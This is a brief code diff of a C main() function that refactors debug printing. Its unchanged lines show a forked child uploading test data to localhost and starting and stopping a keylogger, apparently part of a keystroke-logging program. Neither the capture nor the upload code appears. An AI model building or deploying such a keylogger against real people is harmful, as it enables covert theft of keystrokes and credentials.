@@ -17,9 +17,7 @@ int main()
 
 	if (pid < 0)
 	{
-#ifdef DEBUG
-		printf(P_ERROR "Fork failed\n");
-#endif
+		DEBUG_PRINT((P_ERROR "Fork failed\n"));
 		return ERROR;
 	}
 	else if (pid == 0)
@@ -31,13 +29,12 @@ int main()
 		sleep(2);
 		upload_data("127.0.0.1", PORT, "testing", strlen("testing"));
 
-
 		keylogger_init();
 
 		sleep(2);
 
 		keylogger_end();
 	}
-	
+
 	return OK;
 }
